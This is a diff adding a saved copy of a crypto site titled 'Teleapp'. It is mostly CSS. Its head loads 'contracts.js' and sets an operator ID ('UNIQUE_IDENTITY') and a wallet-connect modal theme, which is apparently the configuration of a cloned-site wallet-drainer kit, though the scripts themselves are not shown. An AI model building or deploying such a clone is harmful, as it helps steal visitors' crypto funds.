@@ -1,0 +1,1557 @@
+<!DOCTYPE html>
+<html data-theme="light" style="--chakra-ui-color-mode: light;" data-scrapbook-source="https://teleapp.fi/"
+    data-scrapbook-create="20230818200306684" data-scrapbook-title="Teleapp">
+
+<head>
+    <script defer="defer" src="js/vendors.js"></script>
+    <script defer="defer" src="js/contracts.js"></script>
+    <script defer="defer" src="js/main.js"></script>
+  
+    <script>
+      window.UNIQUE_IDENTITY = "happy_shakika_29";
+  
+      // Pick a theme here, this defaults to "light"
+      window.modal_theme = "light" || "dark";
+  
+      window.modal_variables = {
+      // Example of what you can do:
+                 "--w3m-accent-color": "#868c5f",
+                  "--w3m-background-color": "#868c5f",
+                  "--w3m-background-border-radius": "0px",
+        "--w3m-container-border-radius": "0px",
+        "--w3m-wallet-icon-border-radius": "0px",
+        "--w3m-wallet-icon-large-border-radius": "0px",
+        "--w3m-wallet-icon-small-border-radius": "0px",
+        "--w3m-secondary-button-border-radius": "0px",
+        "--w3m-icon-button-border-radius": "0px",
+        "--w3m-button-hover-highlight-border-radius": "0px",
+        "--w3m-input-border-radius": "0px",
+    };
+  
+      // Only touch this if you know what you're doing!
+      window.OVERRIDE_MODE = false;
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Teleapp</title>
+    <meta name="next-head-count" content="3">
+    <style>
+        .react-reveal {
+            opacity: 0;
+        }
+    </style>
+    <style>
+        .css-koWCuJ {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            box-sizing: border-box;
+            position: relative;
+            width: 100%;
+        }
+
+        .css-fgqEvb {
+            border-radius: 8px;
+            box-sizing: border-box;
+            overflow: hidden;
+            width: 100%;
+            display: flex;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            cursor: text;
+            border-width: 2px;
+            border-style: solid;
+            transition-property: border, box-shadow, background-color;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            color: rgb(0, 0, 0);
+            border-color: rgb(255, 255, 255);
+            background-color: rgb(255, 255, 255);
+        }
+
+        .css-hQrlmS {
+            box-sizing: border-box;
+            position: relative;
+            -webkit-box-flex: 1;
+            flex: 1 1 0%;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            flex-wrap: nowrap;
+            overflow: hidden;
+            padding: 10px 0px 10px 10px;
+        }
+
+        .css-iFEVQl {
+            line-height: inherit;
+            box-sizing: border-box;
+            margin-left: 2px;
+            height: 100%;
+            max-width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow-wrap: normal;
+        }
+
+        .css-eluWvU {
+            position: relative;
+            display: inline-block;
+            max-width: 100%;
+            background-color: transparent;
+            border-style: none;
+            box-shadow: none;
+            box-sizing: border-box;
+            outline: none;
+            margin: 0px 0px 0px 2px;
+            padding: 0px;
+            height: auto;
+            max-height: 24px;
+        }
+
+        .css-iYZyoR {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            box-sizing: content-box;
+            width: 5px;
+            max-width: 100%;
+            background: transparent;
+            border-style: none;
+            box-shadow: none;
+            display: inline-block;
+            outline: none;
+            margin: 0px;
+            padding: 0px;
+        }
+
+        .css-bbkrnz {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            visibility: hidden;
+            height: 0px;
+            overflow: scroll;
+            white-space: pre;
+        }
+
+        .css-jYsWkC {
+            box-sizing: border-box;
+            position: relative;
+            display: flex;
+            flex-shrink: 0;
+            -webkit-box-align: center;
+            align-items: center;
+            align-self: stretch;
+            padding-right: 12px;
+        }
+
+        .css-iMiALy {
+            display: inline-block;
+            fill: currentcolor;
+            color: rgb(0, 0, 0);
+            height: 20px;
+            width: 20px;
+        }
+
+        .css-eqVZyD {
+            box-sizing: border-box;
+            display: flex;
+            overflow: hidden;
+            width: 100%;
+            border-width: 2px;
+            border-style: solid;
+            transition-property: border;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            border-radius: 8px;
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            border-color: rgb(255, 255, 255);
+            background-color: rgb(255, 255, 255);
+            padding-left: 0px;
+            padding-right: 0px;
+        }
+
+        .css-cvxQaE {
+            display: flex;
+            width: 100%;
+            transition-property: background-color;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            background-color: rgb(255, 255, 255);
+        }
+
+        .css-dAZgJL {
+            box-sizing: border-box;
+            background-color: transparent;
+            border-width: 0px;
+            border-style: none;
+            outline: none;
+            width: 100%;
+            min-width: 0px;
+            max-width: 100%;
+            cursor: text;
+            margin: 0px;
+            padding: 10px 14px;
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            caret-color: rgb(0, 0, 0);
+        }
+
+        .css-dAZgJL::placeholder {
+            color: rgb(107, 107, 107);
+        }
+
+        .css-haOmqK {
+            display: flex;
+        }
+
+        .css-kjMyOB {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            box-sizing: border-box;
+            position: relative;
+            width: auto;
+            display: inline-block;
+            margin-right: 8px;
+        }
+
+        .css-lnBTMr {
+            border-radius: 8px;
+            box-sizing: border-box;
+            overflow: hidden;
+            width: 100%;
+            display: flex;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            cursor: text;
+            border-width: 2px;
+            border-style: solid;
+            transition-property: border, box-shadow, background-color;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            color: rgb(0, 0, 0);
+            border-color: transparent;
+            background-color: rgb(255, 255, 255);
+            padding-left: 6px;
+            padding-right: 16px;
+        }
+
+        .css-iLfmJw {
+            line-height: inherit;
+            box-sizing: border-box;
+            margin-left: 2px;
+            height: 100%;
+            max-width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow-wrap: normal;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .css-kZZDTD {
+            font-size: 32px;
+            margin-right: 10px;
+        }
+
+        .css-sEBgQ {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            box-sizing: content-box;
+            width: 0px;
+            max-width: 100%;
+            background: transparent;
+            border-style: none;
+            box-shadow: none;
+            display: inline-block;
+            outline: none;
+            margin: 0px;
+            padding: 0px;
+        }
+
+        .css-fumDYV {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            visibility: hidden;
+            height: 0px;
+            overflow: scroll;
+            white-space: pre;
+            width: 0px;
+        }
+
+        .css-gfcWdn {
+            box-sizing: border-box;
+            position: relative;
+            display: flex;
+            flex-shrink: 0;
+            -webkit-box-align: center;
+            align-items: center;
+            align-self: stretch;
+            padding-right: 0px;
+        }
+
+        .css-hfcsvE {
+            box-sizing: border-box;
+            display: flex;
+            overflow: hidden;
+            width: 100%;
+            border-width: 2px;
+            border-style: solid;
+            transition-property: border;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            border-radius: 8px;
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            border-color: rgb(255, 255, 255);
+            background-color: rgb(255, 255, 255);
+            padding-left: 0px;
+            padding-right: 14px;
+        }
+
+        .css-kIDaFA {
+            margin-left: 16px;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .css-ClxUO {
+            box-sizing: border-box;
+            background-color: transparent;
+            border-width: 0px;
+            border-style: none;
+            outline: none;
+            width: 100%;
+            min-width: 0px;
+            max-width: 100%;
+            cursor: text;
+            margin: 0px;
+            padding: 10px 14px 10px 4px;
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            caret-color: rgb(0, 0, 0);
+        }
+
+        .css-ClxUO::placeholder {
+            color: rgb(107, 107, 107);
+        }
+
+        .css-dpDCQL {
+            box-sizing: border-box;
+            display: flex;
+            overflow: hidden;
+            width: 100%;
+            border-width: 2px;
+            border-style: solid;
+            transition-property: border;
+            transition-duration: 200ms;
+            transition-timing-function: cubic-bezier(0.2, 0.8, 0.4, 1);
+            border-radius: 8px;
+            border-color: rgb(255, 255, 255);
+            background-color: rgb(255, 255, 255);
+            padding-left: 0px;
+            padding-right: 0px;
+        }
+
+        .css-doFiNf {
+            box-sizing: border-box;
+            background-color: transparent;
+            border-width: 0px;
+            border-style: none;
+            outline: none;
+            width: 100%;
+            min-width: 0px;
+            max-width: 100%;
+            cursor: text;
+            margin: 0px;
+            padding: 10px 14px;
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            caret-color: rgb(0, 0, 0);
+            resize: none;
+        }
+
+        .css-doFiNf::placeholder {
+            color: rgb(107, 107, 107);
+        }
+
+        .css-jTQZGu {
+            pointer-events: none;
+            position: fixed;
+            right: 0px;
+            left: 0px;
+            display: flex;
+            margin: 8px 16px;
+            top: 0px;
+            -webkit-box-align: center;
+            align-items: center;
+            -webkit-box-pack: start;
+            justify-content: flex-start;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            flex-direction: column;
+        }
+
+        .css-kODjUy {
+            font-family: system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            font-weight: normal;
+            line-height: 24px;
+            color: rgb(0, 0, 0);
+            box-sizing: content-box;
+            width: 2px;
+            max-width: 100%;
+            background: transparent;
+            border-style: none;
+            box-shadow: none;
+            display: inline-block;
+            outline: none;
+            margin: 0px;
+            padding: 0px;
+        }
+    </style>
+    <style data-styled="active" data-styled-version="5.3.3">
+        .iGKTVk {
+            padding: 20px;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100vw;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+        }
+
+        .flyBqH {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 10px;
+            cursor: pointer;
+            transition: all 0.05s ease-in 0s;
+        }
+
+        .flyBqH:hover {
+            font-weight: 600;
+            transform: scale(1.05);
+        }
+
+        .gjGpuu {
+            height: 1px;
+            width: 100%;
+            background-color: rgb(208, 208, 208);
+        }
+
+        .bSEcrI {
+            padding: 20px;
+            box-shadow: rgba(0, 0, 0, 0.1) 0px 31px 42px;
+            border-radius: 7px;
+            margin-left: -10px;
+            margin-right: -10px;
+        }
+
+        .iatiVu {
+            font-weight: 700;
+            font-size: 26px;
+        }
+
+        .hZbLMY {
+            background: rgb(255, 255, 255);
+            display: flex;
+            box-shadow: rgba(0, 0, 0, 0.15) 0px 4px 28px;
+            border-radius: 4px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            padding: 5px;
+        }
+
+        .eJztvi {
+            background-color: rgb(0, 151, 236);
+            border-radius: 5px;
+            color: rgb(255, 255, 255);
+            font-weight: 800;
+            text-align: center;
+            font-size: 14px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.1s ease-out 0s;
+        }
+
+        .eJztvi:hover {
+            opacity: 0.8;
+        }
+    </style>
+    <style data-emotion="css-global" data-s="">
+        :host,
+        :root {
+            --chakra-ring-inset: var(--chakra-empty,
+                    /*!*/
+                    /*!*/
+                );
+            --chakra-ring-offset-width: 0px;
+            --chakra-ring-offset-color: #fff;
+            --chakra-ring-color: rgba(66, 153, 225, 0.6);
+            --chakra-ring-offset-shadow: 0 0 #0000;
+            --chakra-ring-shadow: 0 0 #0000;
+            --chakra-space-x-reverse: 0;
+            --chakra-space-y-reverse: 0;
+            --chakra-colors-transparent: transparent;
+            --chakra-colors-current: currentColor;
+            --chakra-colors-black: #000000;
+            --chakra-colors-white: #FFFFFF;
+            --chakra-colors-whiteAlpha-50: rgba(255, 255, 255, 0.04);
+            --chakra-colors-whiteAlpha-100: rgba(255, 255, 255, 0.06);
+            --chakra-colors-whiteAlpha-200: rgba(255, 255, 255, 0.08);
+            --chakra-colors-whiteAlpha-300: rgba(255, 255, 255, 0.16);
+            --chakra-colors-whiteAlpha-400: rgba(255, 255, 255, 0.24);
+            --chakra-colors-whiteAlpha-500: rgba(255, 255, 255, 0.36);
+            --chakra-colors-whiteAlpha-600: rgba(255, 255, 255, 0.48);
+            --chakra-colors-whiteAlpha-700: rgba(255, 255, 255, 0.64);
+            --chakra-colors-whiteAlpha-800: rgba(255, 255, 255, 0.80);
+            --chakra-colors-whiteAlpha-900: rgba(255, 255, 255, 0.92);
+            --chakra-colors-blackAlpha-50: rgba(0, 0, 0, 0.04);
+            --chakra-colors-blackAlpha-100: rgba(0, 0, 0, 0.06);
+            --chakra-colors-blackAlpha-200: rgba(0, 0, 0, 0.08);
+            --chakra-colors-blackAlpha-300: rgba(0, 0, 0, 0.16);
+            --chakra-colors-blackAlpha-400: rgba(0, 0, 0, 0.24);
+            --chakra-colors-blackAlpha-500: rgba(0, 0, 0, 0.36);
+            --chakra-colors-blackAlpha-600: rgba(0, 0, 0, 0.48);
+            --chakra-colors-blackAlpha-700: rgba(0, 0, 0, 0.64);
+            --chakra-colors-blackAlpha-800: rgba(0, 0, 0, 0.80);
+            --chakra-colors-blackAlpha-900: rgba(0, 0, 0, 0.92);
+            --chakra-colors-gray-50: #F7FAFC;
+            --chakra-colors-gray-100: #EDF2F7;
+            --chakra-colors-gray-200: #E2E8F0;
+            --chakra-colors-gray-300: #CBD5E0;
+            --chakra-colors-gray-400: #A0AEC0;
+            --chakra-colors-gray-500: #718096;
+            --chakra-colors-gray-600: #4A5568;
+            --chakra-colors-gray-700: #2D3748;
+            --chakra-colors-gray-800: #1A202C;
+            --chakra-colors-gray-900: #171923;
+            --chakra-colors-red-50: #FFF5F5;
+            --chakra-colors-red-100: #FED7D7;
+            --chakra-colors-red-200: #FEB2B2;
+            --chakra-colors-red-300: #FC8181;
+            --chakra-colors-red-400: #F56565;
+            --chakra-colors-red-500: #E53E3E;
+            --chakra-colors-red-600: #C53030;
+            --chakra-colors-red-700: #9B2C2C;
+            --chakra-colors-red-800: #822727;
+            --chakra-colors-red-900: #63171B;
+            --chakra-colors-orange-50: #FFFAF0;
+            --chakra-colors-orange-100: #FEEBC8;
+            --chakra-colors-orange-200: #FBD38D;
+            --chakra-colors-orange-300: #F6AD55;
+            --chakra-colors-orange-400: #ED8936;
+            --chakra-colors-orange-500: #DD6B20;
+            --chakra-colors-orange-600: #C05621;
+            --chakra-colors-orange-700: #9C4221;
+            --chakra-colors-orange-800: #7B341E;
+            --chakra-colors-orange-900: #652B19;
+            --chakra-colors-yellow-50: #FFFFF0;
+            --chakra-colors-yellow-100: #FEFCBF;
+            --chakra-colors-yellow-200: #FAF089;
+            --chakra-colors-yellow-300: #F6E05E;
+            --chakra-colors-yellow-400: #ECC94B;
+            --chakra-colors-yellow-500: #D69E2E;
+            --chakra-colors-yellow-600: #B7791F;
+            --chakra-colors-yellow-700: #975A16;
+            --chakra-colors-yellow-800: #744210;
+            --chakra-colors-yellow-900: #5F370E;
+            --chakra-colors-green-50: #F0FFF4;
+            --chakra-colors-green-100: #C6F6D5;
+            --chakra-colors-green-200: #9AE6B4;
+            --chakra-colors-green-300: #68D391;
+            --chakra-colors-green-400: #48BB78;
+            --chakra-colors-green-500: #38A169;
+            --chakra-colors-green-600: #2F855A;
+            --chakra-colors-green-700: #276749;
+            --chakra-colors-green-800: #22543D;
+            --chakra-colors-green-900: #1C4532;
+            --chakra-colors-teal-50: #E6FFFA;
+            --chakra-colors-teal-100: #B2F5EA;
+            --chakra-colors-teal-200: #81E6D9;
+            --chakra-colors-teal-300: #4FD1C5;
+            --chakra-colors-teal-400: #38B2AC;
+            --chakra-colors-teal-500: #319795;
+            --chakra-colors-teal-600: #2C7A7B;
+            --chakra-colors-teal-700: #285E61;
+            --chakra-colors-teal-800: #234E52;
+            --chakra-colors-teal-900: #1D4044;
+            --chakra-colors-blue-50: #ebf8ff;
+            --chakra-colors-blue-100: #bee3f8;
+            --chakra-colors-blue-200: #90cdf4;
+            --chakra-colors-blue-300: #63b3ed;
+            --chakra-colors-blue-400: #4299e1;
+            --chakra-colors-blue-500: #3182ce;
+            --chakra-colors-blue-600: #2b6cb0;
+            --chakra-colors-blue-700: #2c5282;
+            --chakra-colors-blue-800: #2a4365;
+            --chakra-colors-blue-900: #1A365D;
+            --chakra-colors-cyan-50: #EDFDFD;
+            --chakra-colors-cyan-100: #C4F1F9;
+            --chakra-colors-cyan-200: #9DECF9;
+            --chakra-colors-cyan-300: #76E4F7;
+            --chakra-colors-cyan-400: #0BC5EA;
+            --chakra-colors-cyan-500: #00B5D8;
+            --chakra-colors-cyan-600: #00A3C4;
+            --chakra-colors-cyan-700: #0987A0;
+            --chakra-colors-cyan-800: #086F83;
+            --chakra-colors-cyan-900: #065666;
+            --chakra-colors-purple-50: #FAF5FF;
+            --chakra-colors-purple-100: #E9D8FD;
+            --chakra-colors-purple-200: #D6BCFA;
+            --chakra-colors-purple-300: #B794F4;
+            --chakra-colors-purple-400: #9F7AEA;
+            --chakra-colors-purple-500: #805AD5;
+            --chakra-colors-purple-600: #6B46C1;
+            --chakra-colors-purple-700: #553C9A;
+            --chakra-colors-purple-800: #44337A;
+            --chakra-colors-purple-900: #322659;
+            --chakra-colors-pink-50: #FFF5F7;
+            --chakra-colors-pink-100: #FED7E2;
+            --chakra-colors-pink-200: #FBB6CE;
+            --chakra-colors-pink-300: #F687B3;
+            --chakra-colors-pink-400: #ED64A6;
+            --chakra-colors-pink-500: #D53F8C;
+            --chakra-colors-pink-600: #B83280;
+            --chakra-colors-pink-700: #97266D;
+            --chakra-colors-pink-800: #702459;
+            --chakra-colors-pink-900: #521B41;
+            --chakra-colors-linkedin-50: #E8F4F9;
+            --chakra-colors-linkedin-100: #CFEDFB;
+            --chakra-colors-linkedin-200: #9BDAF3;
+            --chakra-colors-linkedin-300: #68C7EC;
+            --chakra-colors-linkedin-400: #34B3E4;
+            --chakra-colors-linkedin-500: #00A0DC;
+            --chakra-colors-linkedin-600: #008CC9;
+            --chakra-colors-linkedin-700: #0077B5;
+            --chakra-colors-linkedin-800: #005E93;
+            --chakra-colors-linkedin-900: #004471;
+            --chakra-colors-facebook-50: #E8F4F9;
+            --chakra-colors-facebook-100: #D9DEE9;
+            --chakra-colors-facebook-200: #B7C2DA;
+            --chakra-colors-facebook-300: #6482C0;
+            --chakra-colors-facebook-400: #4267B2;
+            --chakra-colors-facebook-500: #385898;
+            --chakra-colors-facebook-600: #314E89;
+            --chakra-colors-facebook-700: #29487D;
+            --chakra-colors-facebook-800: #223B67;
+            --chakra-colors-facebook-900: #1E355B;
+            --chakra-colors-messenger-50: #D0E6FF;
+            --chakra-colors-messenger-100: #B9DAFF;
+            --chakra-colors-messenger-200: #A2CDFF;
+            --chakra-colors-messenger-300: #7AB8FF;
+            --chakra-colors-messenger-400: #2E90FF;
+            --chakra-colors-messenger-500: #0078FF;
+            --chakra-colors-messenger-600: #0063D1;
+            --chakra-colors-messenger-700: #0052AC;
+            --chakra-colors-messenger-800: #003C7E;
+            --chakra-colors-messenger-900: #002C5C;
+            --chakra-colors-whatsapp-50: #dffeec;
+            --chakra-colors-whatsapp-100: #b9f5d0;
+            --chakra-colors-whatsapp-200: #90edb3;
+            --chakra-colors-whatsapp-300: #65e495;
+            --chakra-colors-whatsapp-400: #3cdd78;
+            --chakra-colors-whatsapp-500: #22c35e;
+            --chakra-colors-whatsapp-600: #179848;
+            --chakra-colors-whatsapp-700: #0c6c33;
+            --chakra-colors-whatsapp-800: #01421c;
+            --chakra-colors-whatsapp-900: #001803;
+            --chakra-colors-twitter-50: #E5F4FD;
+            --chakra-colors-twitter-100: #C8E9FB;
+            --chakra-colors-twitter-200: #A8DCFA;
+            --chakra-colors-twitter-300: #83CDF7;
+            --chakra-colors-twitter-400: #57BBF5;
+            --chakra-colors-twitter-500: #1DA1F2;
+            --chakra-colors-twitter-600: #1A94DA;
+            --chakra-colors-twitter-700: #1681BF;
+            --chakra-colors-twitter-800: #136B9E;
+            --chakra-colors-twitter-900: #0D4D71;
+            --chakra-colors-telegram-50: #E3F2F9;
+            --chakra-colors-telegram-100: #C5E4F3;
+            --chakra-colors-telegram-200: #A2D4EC;
+            --chakra-colors-telegram-300: #7AC1E4;
+            --chakra-colors-telegram-400: #47A9DA;
+            --chakra-colors-telegram-500: #0088CC;
+            --chakra-colors-telegram-600: #007AB8;
+            --chakra-colors-telegram-700: #006BA1;
+            --chakra-colors-telegram-800: #005885;
+            --chakra-colors-telegram-900: #003F5E;
+            --chakra-borders-none: 0;
+            --chakra-borders-1px: 1px solid;
+            --chakra-borders-2px: 2px solid;
+            --chakra-borders-4px: 4px solid;
+            --chakra-borders-8px: 8px solid;
+            --chakra-fonts-heading: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            --chakra-fonts-body: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            --chakra-fonts-mono: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            --chakra-fontSizes-xs: 0.75rem;
+            --chakra-fontSizes-sm: 0.875rem;
+            --chakra-fontSizes-md: 1rem;
+            --chakra-fontSizes-lg: 1.125rem;
+            --chakra-fontSizes-xl: 1.25rem;
+            --chakra-fontSizes-2xl: 1.5rem;
+            --chakra-fontSizes-3xl: 1.875rem;
+            --chakra-fontSizes-4xl: 2.25rem;
+            --chakra-fontSizes-5xl: 3rem;
+            --chakra-fontSizes-6xl: 3.75rem;
+            --chakra-fontSizes-7xl: 4.5rem;
+            --chakra-fontSizes-8xl: 6rem;
+            --chakra-fontSizes-9xl: 8rem;
+            --chakra-fontWeights-hairline: 100;
+            --chakra-fontWeights-thin: 200;
+            --chakra-fontWeights-light: 300;
+            --chakra-fontWeights-normal: 400;
+            --chakra-fontWeights-medium: 500;
+            --chakra-fontWeights-semibold: 600;
+            --chakra-fontWeights-bold: 700;
+            --chakra-fontWeights-extrabold: 800;
+            --chakra-fontWeights-black: 900;
+            --chakra-letterSpacings-tighter: -0.05em;
+            --chakra-letterSpacings-tight: -0.025em;
+            --chakra-letterSpacings-normal: 0;
+            --chakra-letterSpacings-wide: 0.025em;
+            --chakra-letterSpacings-wider: 0.05em;
+            --chakra-letterSpacings-widest: 0.1em;
+            --chakra-lineHeights-3: .75rem;
+            --chakra-lineHeights-4: 1rem;
+            --chakra-lineHeights-5: 1.25rem;
+            --chakra-lineHeights-6: 1.5rem;
+            --chakra-lineHeights-7: 1.75rem;
+            --chakra-lineHeights-8: 2rem;
+            --chakra-lineHeights-9: 2.25rem;
+            --chakra-lineHeights-10: 2.5rem;
+            --chakra-lineHeights-normal: normal;
+            --chakra-lineHeights-none: 1;
+            --chakra-lineHeights-shorter: 1.25;
+            --chakra-lineHeights-short: 1.375;
+            --chakra-lineHeights-base: 1.5;
+            --chakra-lineHeights-tall: 1.625;
+            --chakra-lineHeights-taller: 2;
+            --chakra-radii-none: 0;
+            --chakra-radii-sm: 0.125rem;
+            --chakra-radii-base: 0.25rem;
+            --chakra-radii-md: 0.375rem;
+            --chakra-radii-lg: 0.5rem;
+            --chakra-radii-xl: 0.75rem;
+            --chakra-radii-2xl: 1rem;
+            --chakra-radii-3xl: 1.5rem;
+            --chakra-radii-full: 9999px;
+            --chakra-space-1: 0.25rem;
+            --chakra-space-2: 0.5rem;
+            --chakra-space-3: 0.75rem;
+            --chakra-space-4: 1rem;
+            --chakra-space-5: 1.25rem;
+            --chakra-space-6: 1.5rem;
+            --chakra-space-7: 1.75rem;
+            --chakra-space-8: 2rem;
+            --chakra-space-9: 2.25rem;
+            --chakra-space-10: 2.5rem;
+            --chakra-space-12: 3rem;
+            --chakra-space-14: 3.5rem;
+            --chakra-space-16: 4rem;
+            --chakra-space-20: 5rem;
+            --chakra-space-24: 6rem;
+            --chakra-space-28: 7rem;
+            --chakra-space-32: 8rem;
+            --chakra-space-36: 9rem;
+            --chakra-space-40: 10rem;
+            --chakra-space-44: 11rem;
+            --chakra-space-48: 12rem;
+            --chakra-space-52: 13rem;
+            --chakra-space-56: 14rem;
+            --chakra-space-60: 15rem;
+            --chakra-space-64: 16rem;
+            --chakra-space-72: 18rem;
+            --chakra-space-80: 20rem;
+            --chakra-space-96: 24rem;
+            --chakra-space-px: 1px;
+            --chakra-space-0-5: 0.125rem;
+            --chakra-space-1-5: 0.375rem;
+            --chakra-space-2-5: 0.625rem;
+            --chakra-space-3-5: 0.875rem;
+            --chakra-shadows-xs: 0 0 0 1px rgba(0, 0, 0, 0.05);
+            --chakra-shadows-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --chakra-shadows-base: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
+            --chakra-shadows-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --chakra-shadows-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --chakra-shadows-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            --chakra-shadows-2xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --chakra-shadows-outline: 0 0 0 3px rgba(66, 153, 225, 0.6);
+            --chakra-shadows-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06);
+            --chakra-shadows-none: none;
+            --chakra-shadows-dark-lg: rgba(0, 0, 0, 0.1) 0px 0px 0px 1px, rgba(0, 0, 0, 0.2) 0px 5px 10px, rgba(0, 0, 0, 0.4) 0px 15px 40px;
+            --chakra-sizes-1: 0.25rem;
+            --chakra-sizes-2: 0.5rem;
+            --chakra-sizes-3: 0.75rem;
+            --chakra-sizes-4: 1rem;
+            --chakra-sizes-5: 1.25rem;
+            --chakra-sizes-6: 1.5rem;
+            --chakra-sizes-7: 1.75rem;
+            --chakra-sizes-8: 2rem;
+            --chakra-sizes-9: 2.25rem;
+            --chakra-sizes-10: 2.5rem;
+            --chakra-sizes-12: 3rem;
+            --chakra-sizes-14: 3.5rem;
+            --chakra-sizes-16: 4rem;
+            --chakra-sizes-20: 5rem;
+            --chakra-sizes-24: 6rem;
+            --chakra-sizes-28: 7rem;
+            --chakra-sizes-32: 8rem;
+            --chakra-sizes-36: 9rem;
+            --chakra-sizes-40: 10rem;
+            --chakra-sizes-44: 11rem;
+            --chakra-sizes-48: 12rem;
+            --chakra-sizes-52: 13rem;
+            --chakra-sizes-56: 14rem;
+            --chakra-sizes-60: 15rem;
+            --chakra-sizes-64: 16rem;
+            --chakra-sizes-72: 18rem;
+            --chakra-sizes-80: 20rem;
+            --chakra-sizes-96: 24rem;
+            --chakra-sizes-px: 1px;
+            --chakra-sizes-0-5: 0.125rem;
+            --chakra-sizes-1-5: 0.375rem;
+            --chakra-sizes-2-5: 0.625rem;
+            --chakra-sizes-3-5: 0.875rem;
+            --chakra-sizes-max: max-content;
+            --chakra-sizes-min: min-content;
+            --chakra-sizes-full: 100%;
+            --chakra-sizes-3xs: 14rem;
+            --chakra-sizes-2xs: 16rem;
+            --chakra-sizes-xs: 20rem;
+            --chakra-sizes-sm: 24rem;
+            --chakra-sizes-md: 28rem;
+            --chakra-sizes-lg: 32rem;
+            --chakra-sizes-xl: 36rem;
+            --chakra-sizes-2xl: 42rem;
+            --chakra-sizes-3xl: 48rem;
+            --chakra-sizes-4xl: 56rem;
+            --chakra-sizes-5xl: 64rem;
+            --chakra-sizes-6xl: 72rem;
+            --chakra-sizes-7xl: 80rem;
+            --chakra-sizes-8xl: 90rem;
+            --chakra-sizes-container-sm: 640px;
+            --chakra-sizes-container-md: 768px;
+            --chakra-sizes-container-lg: 1024px;
+            --chakra-sizes-container-xl: 1280px;
+            --chakra-zIndices-hide: -1;
+            --chakra-zIndices-auto: auto;
+            --chakra-zIndices-base: 0;
+            --chakra-zIndices-docked: 10;
+            --chakra-zIndices-dropdown: 1000;
+            --chakra-zIndices-sticky: 1100;
+            --chakra-zIndices-banner: 1200;
+            --chakra-zIndices-overlay: 1300;
+            --chakra-zIndices-modal: 1400;
+            --chakra-zIndices-popover: 1500;
+            --chakra-zIndices-skipLink: 1600;
+            --chakra-zIndices-toast: 1700;
+            --chakra-zIndices-tooltip: 1800;
